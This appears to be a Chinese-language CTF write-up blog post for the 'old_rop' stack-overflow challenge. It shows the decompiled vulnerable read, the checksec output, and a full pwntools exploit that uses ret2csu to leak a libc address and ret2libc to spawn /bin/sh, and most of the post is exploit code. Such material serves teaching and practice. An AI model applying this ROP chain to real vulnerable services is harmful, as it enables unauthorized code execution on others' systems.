---
title: old_rop - ctfplus
published: 2026-03-21
description: "比较典型的ret2csu, ret2libc"
tags: ["ctfwp", "stack"]
category: ctf
draft: false
---

## old_rop

将程序拖入 ida 中发现如下重要函数
```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  _QWORD buf[10]; // [rsp+10h] [rbp-50h] BYREF

  write(1, "Hello, World\n", 0xDu);
  strcpy((char *)buf, "welcome to ret2csu , but there is sometings different,please care about it !");
  write(1, buf, 0x4Du);
  write(1, "\n", 1u);
  read_w();
  return 0;
}
ssize_t read_w()
{
  _BYTE buf[128]; // [rsp+0h] [rbp-80h] BYREF

  return read(0, buf, 0x200u);
}
```
使用 `checksec` 发现如下保护
```txt
 ~#@❯ checksec ./pwn
[*] '/home/yoyo/yoyo_dir/MyProject/aboutPwn/ctfplus/ret2csu/pwn'
  Arch:       amd64-64-little
  RELRO:      Partial RELRO
  Stack:      No canary found
  NX:         NX enabled
  PIE:        No PIE (0x400000)
  SHSTK:      Enabled
  IBT:        Enabled
```
同时分析发现这个题目的版本比较古老存在 csu相关的函数，同时在函数 read_w 中有较大的溢出空间,所以这道题目使用通常的gadget来得到system也是可行的,不过这里使用ret2csu得到libcbase,接下来就是常规的ret2libc的流程

于是得到如下脚本
```python
from pwn import *

FILE = "./pwn_patched"

context.log_level = "debug"
context.binary = FILE

csu1 = 0x4012CA  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu2 = 0x4012B0  # mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]

elf = ELF(FILE)
libc = ELF("./libc.so.6")
rop = ROP(elf)

p = process(FILE)
# p = remote("nc1.ctfplus.cn", 43268)

payload = flat(                 # 这道题目 gadget 给的很多 当然也可以直接用 rop
   {
    0x88: [
      p64(csu1),
      p64(0),                   # rbx = 0
      p64(0),                   # rbp = 0  设置为0， 这样循环只执行一次
      p64(1),                   # r12 -> edi = 1
      p64(elf.got["write"]),    # r13 -> rsi = write@got
      p64(8),                   # r14 -> rdx = 8
      p64(elf.got["write"]),    # r15 -> 执行地址
      p64(csu2),                # 执行call
      p64(0) * 7,
      p64(0x401156)             #  main
    ]
  },
  filler = "\x00"
)
# call 返回后会执行 add rbx, 1; cmp rbx, rbp
# 因为 rbx=0, rbp=0，执行后 rbx=1, cmp 1, 0 → 不相等，不跳转
# 然后执行 loc_4012C6: add rsp, 8; pop rbx; ...
# 所以需要填充 7 个 pop 的值

p.recvuntil(b"welcome to ret2csu , but there is sometings different,please care about it !")
p.recvuntil(b"\n")
p.send(payload)

# 接收泄露的地址
writeAddr = u64(p.recv(8))
log.success(f"write@got: {hex(writeAddr)}")

offset = 0x11c560

libcBase = writeAddr - offset
libc.address = writeAddr - offset
systemAddr = libc.sym["system"]
binsh = next(libc.search("/bin/sh\x00"))

log.success(f"base {hex(libc.address)}")
log.success(f"systemAddr {hex(systemAddr)}")
log.success(f"binsh {hex(binsh)}")

rdi = 0x4012d3
ret = 0x40101a

payload = flat(
  {
    0x88: [
      p64(rdi),
      p64(binsh),
      p64(ret),
      p64(systemAddr)
    ]
  },
  filler = b"\x00"
)

p.send(payload)
p.interactive()
```


## 总结：
在有较大的溢出空间的情况下，ret2csu 能够控制大部分寄存器的状态。所以在gadget稀少的情况下，如果条件允许，可以考虑使用ret2csu


